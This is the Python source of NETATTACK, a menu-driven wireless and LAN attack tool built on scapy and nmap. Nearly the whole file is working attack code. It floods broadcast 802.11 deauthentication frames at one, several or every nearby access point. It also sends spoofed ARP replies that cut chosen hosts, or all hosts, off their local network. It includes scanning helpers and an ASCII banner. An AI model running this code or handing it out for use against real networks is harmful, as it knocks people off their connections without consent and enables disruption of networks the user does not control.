#!/usr/bin/env python

import os
import sys
import socket
import logging
from threading import Thread
import socket
from time import sleep
from subprocess import Popen, PIPE

# COLORS
B, R, Y, G, N = '\33[94m', '\033[91m', '\33[93m', '\033[1;32m', '\033[0m'

# making scapy quite
logging.getLogger('scapy.runtime').setLevel(logging.ERROR)
try:
    import nmap
    import argparse
    from scapy.all import *
except:
    print('\n{0}ERROR: Please install all requirements (README)!\n'.format(R))
    sys.exit(1)

# making scapy quite
conf.verb = 0

try:
    # check for root privileges
    if os.geteuid() != 0:
        print('\n{0}ERROR: Netattack needs to be started as a super user (root privileges).\n'.format(R))
        sys.exit(1)
        
# geteuid() throws error on windows
except:
    print('\n{0}ERROR: If you\'re using Windows, please start Netattack under Linux.\n'.format(R))
    sys.exit(1)


def print_banner():
    # IF THE ANIMATION AT THE BEGINNING PISSES YOU OFF, SIMPLY REMOVE sleep(x) :)
    
    os.system('clear')
    print('''{0}{1}
    O       O    O O O O   O O O O O         O        O O O O O   O O O O O         O         O O O O O    O       O
    O O     O    O             O            O O           O           O            O O        O            O     O 
    O  O    O    O             O           O   O          O           O           O   O       O            O   O
    O   O   O    O O O O       O          O     O         O           O          O     O      O            O O
    O    O  O    O             O         O O O O O        O           O         O O O O O     O            O   O
    O     O O    O             O        O         O       O           O        O         O    O            O     O
    O       O    O O O O       O       O           O      O           O       O           O   O O O O O    O       O'''.format('\n' * 1, G))
    
    sleep(0.7)

    print('''\n\n{0}{1}D I S C O V E R   W H A T 'S   P O S S I B L E'''.format(' '*40, Y))
    sleep(0.4)
    print('''{0}{1}b y   c h r i z a t o r{2}{3}'''.format(' '*53, R, N, '\n' * 1))
    sleep(0.4)



def get_choice():
    print('''
    {0}-----------
    | S C A N |
    -----------{4}

      {2}({1}1{2}) {4}Scan for Access-Points
      {2}({1}2{2}) {4}Scan for hosts in your network


    {0}---------------
    | A T T A C K |
    ---------------{4}

      {5}DEAUTH
        {2}({1}3{2}) {4}Deauth ONE network
        {2}({1}4{2}) {4}Deauth MULTIPLE networks

        {2}({1}5{2}) {4}Deauth ALL networks in your area

      {5}KICK
        {2}({1}6{2}) {4}Kick ONE user off your network
        {2}({1}7{2}) {4}Kick MULTIPLE users off your network

        {2}({1}8{2}) {4}Kick ALL users off your network (except you)


    {2}({1}9{2}) {4}EXIT{3}'''.format(G, Y, R, '\n' * 3, N, B))

    def choice_input():
        global choice
        try:
            choice = int(input('{0}{1}#{2}> {3}'.format(B, ' ' * 4, R, N)))
        except(KeyboardInterrupt):
            print('\n{0}Thanks for using NETATTACK! See you later!'.format(G))
            sys.exit(1)
        except:
            print('{0}ERROR: Your input was incorrect.'.format(R))
            choice_input()

        if choice not in range(1, 11):
            print('{0}ERROR: Your input was incorrect.'.format(R))
            choice_input()

    choice_input()
    return choice


def handle_choice():
    if choice == 1:
        wifi_scan(True, False, True)
    elif choice == 2:
        host_scan(True, True, False, True)
    elif choice == 3:
        deauth_one()
    elif choice == 4:
        deauth_multiple()
    elif choice == 5:
        deauth_all()
    elif choice == 6:
        kick_one()
    elif choice == 7:
        kick_multiple()
    elif choice == 8:
        kick_all()
        
    elif choice == 9:
        print('{0}Thanks for using NETATTACK! See you later!'.format(G))
        sys.exit(0)



def get_iface():
    def choice_input():
        global iface_choice
        try:
            iface_choice = int(raw_input('{0}{1}#{2}>{3} '.format(B, ' '*4, R, N)))
        except(KeyboardInterrupt):
            print('\n{0}Thanks for using NETATTACK! See you later!'.format(G))
            sys.exit(1)
        except:
            print('{0}ERROR: Your input was incorrect.'.format(R))
            choice_input()

        if iface_choice not in iface_dict:
            print('{0}ERROR: Your input was incorrect.'.format(R))
            choice_input()
    
    os.system('clear')
    num = 1
    iface_dict = {}
    iface = ''
    try:
        _ = os.listdir('/sys/class/net/')
    except:
        print('{0}ERROR: Unable to detect interfaces. Please type interface-name manually.'.format(R))
        try:
            iface = raw_input('\n{0}Interface-Name {1}#{2}>{3} '.format(G, B, R, N))
        except:
            print('\n{0}Thanks for using NETATTACK! See you later!'.format(G))
            sys.exit(1)
            
        if len(iface) > 0:
            return iface
        print('{0nERROR: Your input was incorrect.\n'.format(R))
        
    print('{0}Please choose an interface that fits your action (wireless, wired...):{1}'.format(G, '\n' * 1))
    for iface in os.listdir('/sys/class/net/'):
        print('{0}{1}({4}{3}{1}) {2}{5}'.format(' ' * 4, R, N, str(num), Y, iface))
        iface_dict[num] = iface
        num += 1
    print('\n')

    choice_input()
            
    iface = iface_dict[iface_choice]
    return iface


def get_gateway():
    try:
        gateway_pkt = sr1(IP(dst="google.com", ttl=0) / ICMP() / "XXXXXXXXXXX", verbose=False)
        return gateway_pkt.src
    except:
        os.system('clear')
        print('{0}ERROR: Script is unable to retrieve Gateway-IP address.\nPlease type in manually.\n'.format(R))
        try:
            gateway_ip = raw_input('\n{0}Gateway-IP {1}#{2}>{3} '.format(G, B, R, N))
        except(KeyboardInterrupt):
            print('\n{0}Thanks for using NETATTACK! See you later!'.format(G))
            sys.exit(1)
        return gateway_ip

def get_gateway_mac(IP):
    nm = nmap.PortScanner()
    x = nm.scan(hosts=IP, arguments='-sP')

    for k, v in x['scan'].iteritems():
        if str(v['status']['state']) == 'up':
            return str(v['addresses']['mac'])
        
    os.system('clear')
    print('{0}ERROR: Script is unable to retrieve Gateway-MAC address. \nPlease type in manually.\n'.format(R))
    gateway_mac = raw_input('\n{0}Gateway-MAC {1}#{2}>{3} '.format(G, B, R, N))
    return gateway_mac

def enable_monitor_mode(iface):
    try:
        os.system('ifconfig {0} down'.format(iface))
        os.system('iwconfig {0} mode monitor'.format(iface))
        os.system('ifconfig {0} up'.format(iface))
    except:
        print('{0}INTERFACE ERROR'.format(R))
        sys.exit(1)

def disable_monitor_mode(iface):
    os.system('ifconfig {0} down'.format(iface))
    os.system('iwconfig {0} mode managed'.format(iface))
    os.system('ifconfig {0} up'.format(iface))




def wifi_scan(do_output, do_deauth, verbose, iface=None):
    global ID
    def packet_handler(pkt):
        global ID
        bssid = pkt.addr2
        essid = pkt.info
        enc = None
        channel = None
        cap = pkt.sprintf('{Dot11Beacon:%Dot11Beacon.cap%}'
                          '{Dot11ProbeResp:%Dot11ProbeResp%}')
        elt = pkt[Dot11Elt]

        if bssid not in APs:
            while isinstance(elt, Dot11Elt):
                if elt.ID == 3:
                    channel = ord(elt.info)
                elif elt.ID == 48:
                    enc = 'WPA2'
                elif elt.ID == 221 and elt.info.startswith('\x00P\xf2\x01\x01\x00'):
                    enc = 'WPA1'
                if not enc:
                    if 'privacy' in cap:
                        enc = 'WEP'
                    else:
                        enc = 'OPEN'
                elt = elt.payload
            APs[bssid] = {'essid': essid, 'enc': enc, 'channel': channel, 'id': ID}
            ID += 1
            if do_output and do_print_ap:
                output(bssid, essid, enc, channel)
            else:
                return

    def channelhop(iface):
        channel = 1
        while channel < 15:
            if do_channelhop:
                try:
                    os.system('iwconfig {0} channel {1}'.format(iface, channel))
                except:
                    print('{0}INTERFACE ERROR'.format(R))
                    sys.exit(1)
                    
                sleep(0.1)
                if channel >= 14:
                    channel = 1
                    continue
                channel += 1

    def output(bssid, essid, enc, channel):
        channel_space = 2
        if len(str(channel)) == 1:
            channel_space = 3
        print('{0}{1}  {2}|  {3}{4}|  {5}{6}  {2}|  {7}{8}{2}'.format(R, bssid.upper(), N, str(channel), ' '*channel_space, B, enc, Y, essid))


    ID = 1
    if not iface:
        iface = get_iface()
        
    if verbose:
        print('\n{0}Turning on {1}MONITORING {0}mode ...{2}'.format(G, R, N))

    enable_monitor_mode(iface)

    thread_channelhop = Thread(target=channelhop, args=[iface])
    thread_channelhop.daemon = True
    thread_channelhop.start()

    if do_output:
        if not do_deauth:
            os.system('clear')
        print('\n{0}BSSID{1}CH{2}ENC{3}ESSID'.format(N, ' '*17, ' '*5, ' '*6))


    sniff(iface=iface, prn=packet_handler, lfilter=lambda x: (Dot11ProbeResp in x or Dot11Beacon in x), store=0)
    

def host_scan(iface_known, do_output, kick_output, verbose):
    def get_ip_range():
        for net, msk, _, iface, addr in conf.route.routes:
            if iface == 'lo' or addr == '127.0.0.1':
                continue
            if net <= 0 or msk <= 0:
                continue
            sub = utils.ltoa(net)
            cidr = bin(msk).count('1')
            return '{0}/{1}'.format(sub, cidr)

    def ask_for_ip_range(ip_range):
        os.system('clear')
        print('{0}The script automatically searched for an IP-Range to be scanned.\nPress {1}ENTER {2}to keep it or {3}type in your custom range{4}.{5}'.format(G, R, G, R, G, N))

        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            print('\n{0}{1}Your local IP: {2}{3}{4}'.format(' ' * 4, Y, R, s.getsockname()[0], N))
            s.close()
        except:
            print('\n{0}{1}Your local IP: {2}{3}{4}'.format(' ' * 4, Y, R, 'ERROR', N))
            
        print('{0}{1}Current IP-Range: {2}{3}{4}'.format(' ' * 4, Y, R, ip_range, N))

        try:
            user_input = raw_input('\n{0}{1}#{2}>{3} '.format(' ' * 4, B, R, N))
        except(KeyboardInterrupt):
            print('\n{0}Thanks for using NETATTACK! See you later!'.format(G))
            sys.exit(1)
            
        if user_input == '':
            return ip_range
        else:
            return user_input

    def output(hosts):
        max_ip_length = 0
        
        if len(hosts) == 0:
            print('{0}0 hosts are up. :/{1}'.format(R, N))
            sys.exit(0)
            
        for ip in hosts:
            if len(ip) > max_ip_length:
                max_ip_length = len(ip)

        print('\n')        
        for ip in hosts:
            if kick_output is True:
                print('    [{5}{0}{4}]     {1}{2}{3}{4}({5}{6}{4}) | {7}{8}{4}'.format(hosts[ip]['id'], Y, ip,' ' * (max_ip_length-len(ip)+1), N, R, hosts[ip]['mac'], B, hosts[ip]['name']))
            else:
                print('{0}{1}{2}{3}({4}{5}{3}) | {6}{7}{3}'.format(Y, ip,' ' * (max_ip_length-len(ip)+1), N, R, hosts[ip]['mac'], B, hosts[ip]['name']))

        print('\n{0}{1}{2} {3}hosts are up. Finished scanning.\n'.format(' '*4, R, len(hosts), G))

    hosts = {}

    if not iface_known:
        iface = get_iface()
        conf.iface = iface
        
    ip_range = get_ip_range()
    ip_range = ask_for_ip_range(ip_range)

    if verbose:
        os.system('clear')
        print('{0}Scanning your network. Stand by!{1}'.format(G, N))

    ID = 1
    nm = nmap.PortScanner()
    x = nm.scan(hosts=ip_range, arguments='-sP')

    for k, v in x['scan'].iteritems():
        if str(v['status']['state']) == 'up':
            try:
                MAC = str(v['addresses']['mac'])
                IP = str(v['addresses']['ipv4'])
            except:
                continue
            try:
                NAME = socket.gethostbyaddr(IP)[0]
            except:
                NAME = 'Unknown NAME'

            hosts[IP] = {'mac': MAC, 'name': NAME, 'id': ID}
            ID += 1

    if do_output:
        output(hosts)

    return hosts


def deauth_one():
    global do_channelhop
    def choice_input():
        if len(APs) < 1:
            print('{0}No Access-Points found :/{1}\n'.format(R, N))
            sys.exit(1)
            
        while True:
            try:
                user_input = raw_input('{0}{1}#{2}>{3} '.format(B, ' '*4, R, N))
            except(KeyboardInterrupt):
                print('\n{0}Thanks for using NETATTACK! See you later!'.format(G))
                sys.exit(1)
            try:
                _ = int(user_input)
            except:
                print('{0}ERROR: Your input was incorrect.'.format(R))
                continue

            if _ not in range(1, len(APs)+1) and _ != 1:
                print('{0}ERROR: Your input was incorrect.'.format(R))
                continue

            return _

    def deauth():
        print('\n{0}Deauthing ...{1}\n'.format(G, N))

        os.system('iwconfig {0} channel {1}'.format(iface, CHANNEL))
        while True:
            for x in range(64):
                try:
                    send(Dot11(addr1='FF:FF:FF:FF:FF:FF', addr2=BSSID, addr3=BSSID) / Dot11Deauth())
                except(KeyboardInterrupt):
                    print('{0}Deauthing cancelled.{1}'.format(R, N))
                    sys.exit(1)
            
    
    iface = get_iface()
    conf.iface = iface
    
    thread_scan = Thread(target=wifi_scan, args=[False, False, True, iface])
    thread_scan.daemon = True
    thread_scan.start()

    os.system('clear')
    print('\n{0}Scanning for Access-Points. Press {1}Ctrl+C {0}to continue choosing a target.{2}'.format(G, R, N))
    print('\n{0}{4}BSSID{1}CH{2}ENC{3}ESSID'.format(N, ' '*17, ' '*5, ' '*6, ' '*6))

    printed_APs = []
    try:
        while True:
            for bssid in APs.keys():
                if bssid not in printed_APs:
                    channel = APs[bssid]['channel']
                    essid = APs[bssid]['essid']
                    enc = APs[bssid]['enc']
                    ID = APs[bssid]['id']
        
                    channel_space = 2
                    if len(str(channel)) == 1:
                        channel_space = 3

                    print(' {2}[{7}{9}{2}]  {0}{1}  {2}|  {3}{4}|  {5}{6}  {2}|  {7}{8}{2}'.format(R, bssid.upper(), N, str(channel), ' '*channel_space, B, enc, Y, essid, ID))
                    printed_APs.append(bssid)

    except(KeyboardInterrupt):
        do_channelhop = False
        pass

    print('\n{0}Choose {1}ONE {0}of the targets listed above.{2}\n'.format(G, R, N))
    chosen_ID = choice_input()
    BSSID, CHANNEL = None, None

    for bssid in APs:
        if APs[bssid]['id'] == chosen_ID:
            BSSID = bssid
            CHANNEL = APs[bssid]['channel']

    deauth()
        
def deauth_multiple():
    global do_channelhop
    def choice_input():
        while True:
            try:
                user_input = raw_input('{0}{1}#{2}>{3} '.format(B, ' '*4, R, N))
            except(KeyboardInterrupt):
                print('\n{0}Thanks for using NETATTACK! See you later!'.format(G))
                sys.exit(1)

            user_input = user_input.replace(' ', '')
            target_list_str = user_input.split(',')
            target_list = []

            try:
                for num in target_list_str:
                    _ = int(num)
            except:
                print('{0}ERROR: Your input was incorrect.'.format(R))
                continue

            for x in target_list_str:
                target_list.append(int(x))

            for num in target_list:
                if num < 1 or num > len(APs):
                    target_list.remove(num)

            if len(target_list) <= 1:
                print('{0}ERROR: Your input was incorrect.'.format(R))
                continue
            return target_list
        
    def deauth():
        print('\nDeauth-List:')
        for ID in target_list:
            for bssid in APs:
                if APs[bssid]['id'] == ID:
                    print('{0}{1} {4}| {2}{3}{4}'.format(R, bssid.upper(), Y, APs[bssid]['essid'], N))
        print('\n{0}Deauthing ...\n{1}'.format(G, N))
        
        while True:
            for ID in target_list:
                for bssid in APs:
                    if APs[bssid]['id'] == ID:
                        os.system('iwconfig {0} channel {1}'.format(iface, APs[bssid]['channel']))
                        for x in range(64):
                            try:
                                send(Dot11(addr1='FF:FF:FF:FF:FF:FF', addr2=bssid, addr3=bssid) / Dot11Deauth())
                            except(KeyboardInterrupt):
                                print('{0}Deauthing cancelled.{1}'.format(R, N))
                                sys.exit(1)


    iface = get_iface()
    conf.iface = iface

    thread_scan = Thread(target=wifi_scan, args=[False, False, True, iface])
    thread_scan.daemon = True
    thread_scan.start()

    os.system('clear')
    print('\n{0}Scanning for Access-Points. Press {1}Ctrl+C {0}to continue choosing a target.{2}'.format(G, R, N))
    print('\n{0}{4}BSSID{1}CH{2}ENC{3}ESSID'.format(N, ' '*17, ' '*5, ' '*6, ' '*6))

    printed_APs = []
    try:
        while True:
            for bssid in APs.keys():
                if bssid not in printed_APs:
                    channel = APs[bssid]['channel']
                    essid = APs[bssid]['essid']
                    enc = APs[bssid]['enc']
                    ID = APs[bssid]['id']
        
                    channel_space = 2
                    if len(str(channel)) == 1:
                        channel_space = 3

                    print(' {2}[{7}{9}{2}]  {0}{1}  {2}|  {3}{4}|  {5}{6}  {2}|  {7}{8}{2}'.format(R, bssid.upper(), N, str(channel), ' '*channel_space, B, enc, Y, essid, ID))
                    printed_APs.append(bssid)

    except(KeyboardInterrupt):
        do_channelhop = False
        pass

    print('\n\n{0}Choose {1}MULTIPLE {0}targets listed above.\nSeperate each target by tiping \'{1},{0}\'\n{2}'.format(G, R, N))

    target_list = choice_input()
    deauth()

def deauth_all():
    global do_deauth, do_channelhop, do_print_ap
    def pause():
        global do_deauth, do_channelhop, do_print_ap, APs
        while True:
            sleep(120)
            print('\n{0}Scanning ...{1}\n'.format(G, N))
            APs = {}
            do_print_ap = True
            do_channelhop = True
            do_deauth = False
            sleep(10)
            print('\n{0}Deauthing ...{1}\n'.format(G, N))
            do_channelhop = False
            do_deauth = True
            do_print_ap = False
            
    

    iface = get_iface()
    conf.iface = iface

    scan_thread = Thread(target=wifi_scan, args=[True, True, False, iface])
    scan_thread.daemon = True
    pause_thread = Thread(target=pause, args=[])
    pause_thread.daemon = True

    os.system('clear')
    print('{0}Scanning for networks each 120s (duration: 10s){1}\n'.format(G, N))

    scan_thread.start()
    pause_thread.start()
    sleep(10)

    do_channelhop = False
    do_print_ap = False

    print('\n{0}Deauthing ...{1}\n'.format(G, N))
    while True:
        if do_deauth:
            for bssid in APs.keys():
                os.system('iwconfig {0} channel {1}'.format(iface, APs[bssid]['channel']))
                for x in range(2):
                    try:
                        send(Dot11(addr1='FF:FF:FF:FF:FF:FF', addr2=bssid, addr3=bssid) / Dot11Deauth())
                    except(KeyboardInterrupt):
                        print('{0}Deauthing cancelled.{1}'.format(R, N))
                        sys.exit(1)
                    except:
                        continue
    


def restore_kick(targets, gatewayIP, gatewayMAC):
    print('\n\n{0}RESTORING TARGET(S): {1}Don\'t interrupt!{2}'.format(G, R, N))
    for ip in targets:
        IP = ip
        MAC = targets[ip]['mac']
        success = True

        for x in range(10):
            try:
                send(ARP(op=2, pdst=IP, psrc=gatewayIP, hwdst='FF:FF:FF:FF:FF:FF', hwsrc=gatewayMAC))
                send(ARP(op=2, pdst=gatewayIP, psrc=IP, hwdst='FF:FF:FF:FF:FF:FF', hwsrc=MAC))
            except:
                print('{0}ERROR: Can\'t restore {1}{2} {3}({4}{5}{3}). {0}Skipping.'.format(R, Y, MAC, N, B, IP))
                success = False
                pass
            sleep(0.3)
        if success:
            print('{0}{1}Successfully restored: {2}{3} {4}({5}{6}{4})'.format(' ' * 4, G, R, MAC, N, Y, IP))
    print('\n')
    sys.exit(0)

def kick_one():
    global kick_hosts
    def choice_input():
        global kick_hosts
        while True:
            try:
                user_input = raw_input('{0}{1}#{2}>{3} '.format(B, ' '*4, R, N))
            except(KeyboardInterrupt):
                print('\n{0}Thanks for using NETATTACK! See you later!'.format(G))
                sys.exit(1)

            if user_input.upper() != 'R':
                try:
                    ID = int(user_input)
                except(KeyboardInterrupt):
                    print('\n{0}Thanks for using NETATTACK! See you later!'.format(G))
                    sys.exit(1)
                except:
                    print('{0}ERROR: Your input was incorrect.'.format(R))
                    continue

                if ID not in range(len(kick_hosts)+1):
                    print('{0}ERROR: Your input was incorrect.'.format(R))
                    continue
                return ID
            else:
                kick_hosts = {}
                kick_hosts = host_scan(True, True, True, True)
                print('\n{0}{1}Choose {2}ONE {1}of the hosts listed above or press {2}R {1}for rescan:{3}'.format(' ' * 4, G, R, N))
            
    def kick():
        while True:
            try:
                send(ARP(op=2, psrc=gatewayIP, pdst=IP, hwdst=gatewayMAC))
                sleep(4)
            except(KeyboardInterrupt):
                targets = {}
                targets[IP] = {'mac': MAC}
                restore_kick(targets, gatewayIP, gatewayMAC)

    gatewayIP = get_gateway()
    gatewayMAC = get_gateway_mac(gatewayIP)

    kick_hosts = host_scan(True, True, True, True)

    print('\n{0}{1}Choose {2}ONE {1}of the hosts listed above or press {2}R {1}for rescan:{3}\n'.format(' ' * 4, G, R, N))
    chosen_ID = choice_input()

    MAC, IP, NAME = None, None, None

    for ip in kick_hosts:
        if kick_hosts[ip]['id'] == chosen_ID:
            MAC = kick_hosts[ip]['mac']
            IP = ip
            NAME = kick_hosts[ip]['name']

    os.system('clear')
    print('{0}Currently kicking: {1}{2} {3}| {4}{5} {3}| {6}{7}{3}'.format(G, R, MAC, N, Y, IP, B, NAME))
    kick()

def kick_multiple():
    global kick_hosts

    def choice_input():
        global kick_hosts
        while True:
            try:
                user_input = raw_input('{0}{1}#{2}>{3} '.format(B, ' '*4, R, N))
            except(KeyboardInterrupt):
                print('\n{0}Thanks for using NETATTACK! See you later!'.format(G))
                sys.exit(1)

            if user_input.upper() != 'R':
                user_input = user_input.replace(' ', '')
                target_list_str = user_input.split(',')
                target_list = []
        
                try:
                    for num in target_list_str:
                        _ = int(num)
                except:
                    print('{0}ERROR: Your input was incorrect.'.format(R))
                    continue
                
                for x in target_list_str:
                    target_list.append(int(x))

                for num in target_list:
                    if num < 1 or num > len(kick_hosts):
                        target_list.remove(num)
                if len(target_list) <= 1:
                    print('{0}ERROR: Your input was incorrect.'.format(R))
                    continue
                
                return target_list                         
        else:
            kick_hosts = {}
            kick_hosts = host_scan(True, True, True, True)
            print('\n{0}{1}Choose {2}MULTIPLE {1}hosts listed above or press {2}R {1}for rescan:\n{0}Seperate the targets with \'{2},{1}\'\n'.format(' ' * 4, G, R, N))


    def kick():
        targets = {}
        while True:
            for target in target_list:
                for host in kick_hosts:
                    if target == kick_hosts[host]['id']:
                        MAC = kick_hosts[host]['mac']
                        IP = host
                        NAME = kick_hosts[host]['name']
                        targets[IP] = {'mac': MAC}

                        try:
                            send(ARP(op=2, psrc=gatewayIP, pdst=IP, hwdst=gatewayMAC))
                        except(KeyboardInterrupt):
                            restore_kick(targets, gatewayIP, gatewayMAC)
            try:
                sleep(3.5)
            except:
                restore_kick(targets, gatewayIP, gatewayMAC)
                
                    
    gatewayIP = get_gateway()
    gatewayMAC = get_gateway_mac(gatewayIP)

    kick_hosts = host_scan(True, True, True, True)

    print('\n{0}{1}Choose {2}MULTIPLE {1}hosts listed above or press {2}R {1}for rescan:\n{0}Seperate the targets with \'{2},{1}\'\n'.format(' ' * 4, G, R, N))
    target_list = choice_input()

    os.system('clear')
    kick_msg = False
    for target in target_list:
        for host in kick_hosts:
            if target == kick_hosts[host]['id']:
                MAC = kick_hosts[host]['mac']
                IP = host
                NAME = kick_hosts[host]['name']
                if kick_msg:
                    print('{8}{1}{2} {3}| {4}{5} {3}| {6}{7}{3}'.format(G, R, MAC, N, Y, IP, B, NAME, ' '*19))
                if not kick_msg:
                    print('{0}Currently kicking{3}: {1}{2} {3}| {4}{5} {3}| {6}{7}{3}'.format(G, R, MAC, N, Y, IP, B, NAME))
                    kick_msg = True
    kick()

def kick_all():

    def kick():
        for host in kick_hosts.keys():
            if host == gatewayIP:
                print('{0}      -> not kicking: {1}{2}{0} ({4}gateway{0}){3}'.format(G, Y, gatewayIP, N, R))
                del kick_hosts[host]

        while True:
            for host in kick_hosts:
                try:
                    send(ARP(op=2, psrc=gatewayIP, pdst=host, hwdst=gatewayMAC))
                except(KeyboardInterrupt):
                    restore_kick(kick_hosts, gatewayIP, gatewayMAC)
            try:       
                sleep(2)
            except(KeyboardInterrupt):
                restore_kick(kick_hosts, gatewayIP, gatewayMAC)
                

    gatewayIP = get_gateway()
    gatewayMAC = get_gateway_mac(gatewayIP)

    kick_hosts = host_scan(True, True, False, True)

    sleep(0.2)
    print('\n{0}KICKING STARTED ...{1}'.format(G, N))
    
    kick()

#> MAIN
do_channelhop = True
do_deauth = True
do_print_ap = True
APs = {}

if __name__ == '__main__':
    
    print_banner()
    choice = get_choice()
    handle_choice()




